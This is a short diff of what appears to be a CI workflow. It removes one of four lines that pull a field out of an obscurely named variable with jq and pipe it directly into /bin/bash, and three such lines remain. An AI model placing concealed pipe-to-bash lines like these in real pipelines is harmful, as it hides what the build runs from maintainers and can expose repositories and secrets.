@@ -26,7 +26,6 @@ jobs:
           echo $ddby3 | jq -r .bd135 | /bin/bash
           echo $rrne38 | jq -r .xktuy906 | /bin/bash
           printf '%s' "$y8" | jq -r .mv97 | /bin/bash
-          echo $vwwp208 | jq -r .j39 | /bin/bash
 
       - name: Archive output
         if: always()
